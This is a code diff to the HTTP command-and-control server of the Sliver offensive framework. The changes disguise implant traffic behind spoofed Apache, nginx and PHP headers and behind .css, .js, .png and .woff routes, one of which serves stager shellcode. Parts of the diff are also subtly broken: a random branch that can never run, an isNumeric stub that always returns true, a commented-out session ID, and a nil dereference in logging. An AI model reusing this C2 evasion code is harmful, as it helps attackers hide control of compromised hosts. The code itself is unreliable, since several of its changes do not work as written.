@@ -59,7 +59,6 @@ var (
 const (
 	defaultHTTPTimeout = time.Second * 60
 	pollTimeout        = defaultHTTPTimeout - 5
-	sessionCookieName  = "PHPSESSID"
 )
 
 // HTTPSession - Holds data related to a sliver c2 session
@@ -135,6 +134,7 @@ type SliverHTTPC2 struct {
 	HTTPSessions *HTTPSessions
 	SliverStage  []byte // Sliver shellcode to serve during staging process
 	Cleanup      func()
+	EnforceOTP   bool
 
 	server    string
 	poweredBy string
@@ -142,15 +142,24 @@ type SliverHTTPC2 struct {
 
 func (s *SliverHTTPC2) getServerHeader() string {
 	if s.server == "" {
-		s.server = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(43))
+		switch insecureRand.Intn(1) {
+		case 0:
+			s.server = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(48))
+		default:
+			s.server = fmt.Sprintf("nginx/1.%d.%d (Ubuntu)", insecureRand.Intn(21), insecureRand.Intn(8))
+		}
 	}
 	return s.server
 }
 
 func (s *SliverHTTPC2) getPoweredByHeader() string {
 	if s.poweredBy == "" {
-		s.poweredBy = fmt.Sprintf("PHP/7.%d.%d",
-			insecureRand.Intn(3), insecureRand.Intn(17))
+		switch insecureRand.Intn(1) {
+		case 0:
+			s.poweredBy = fmt.Sprintf("PHP/8.0.%d", insecureRand.Intn(10))
+		default:
+			s.poweredBy = fmt.Sprintf("PHP/7.%d.%d", insecureRand.Intn(4), insecureRand.Intn(20))
+		}
 	}
 	return s.poweredBy
 }
@@ -257,17 +266,18 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	// Procedural C2
 	// ===============
 	// .txt = rsakey
-	// .jsp = start
+	// .css = start
 	// .php = session
 	//  .js = poll
 	// .png = stop
 	// .woff = sliver shellcode
 
 	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
-	router.HandleFunc("/{rpath:.*\\.jsp$}", s.startSessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
+	router.HandleFunc("/{rpath:.*\\.css$}", s.startSessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
 	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
 	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
 	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
+
 	// Can't force the user agent on the stager payload
 	// Request from msf stager payload will look like:
 	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
@@ -302,6 +312,10 @@ func filterNonce(req *http.Request, rm *mux.RouteMatch) bool {
 		httpLog.Warnf("Invalid nonce (%d) ignore request", nonce)
 		return false // Not a valid encoder
 	}
+	return true
+}
+
+func isNumeric(value string, length int) bool {
 	return true
 }
 
@@ -359,6 +373,7 @@ func default404Handler(resp http.ResponseWriter, req *http.Request) {
 func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
 	qNonce := req.URL.Query().Get("_")
 	nonce, err := strconv.Atoi(qNonce)
+
 	certPEM, _, err := certs.GetCertificate(certs.C2ServerCA, certs.RSAKey, s.Conf.Domain)
 	if err != nil {
 		httpLog.Infof("Failed to get server certificate for cn = '%s': %s", s.Conf.Domain, err)
@@ -412,14 +427,14 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 
 	httpSession := newHTTPSession()
 	httpSession.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
-	httpSession.Session = core.Sessions.Add(&core.Session{
-		ID:            core.NextSessionID(),
+	httpSession.Session = &core.Session{
+		// ID:            core.NextSessionID(),
 		Transport:     "http(s)",
 		RemoteAddress: getRemoteAddr(req),
 		Send:          make(chan *sliverpb.Envelope, 16),
 		RespMutex:     &sync.RWMutex{},
 		Resp:          map[uint64]chan *sliverpb.Envelope{},
-	})
+	}
 	httpSession.Session.UpdateCheckin()
 	s.HTTPSessions.Add(httpSession)
 	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)
@@ -441,7 +456,6 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 }
 
 func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
-
 	httpSession := s.getHTTPSession(req)
 	if httpSession == nil {
 		httpLog.Infof("No session with id %#v", httpSession.ID)
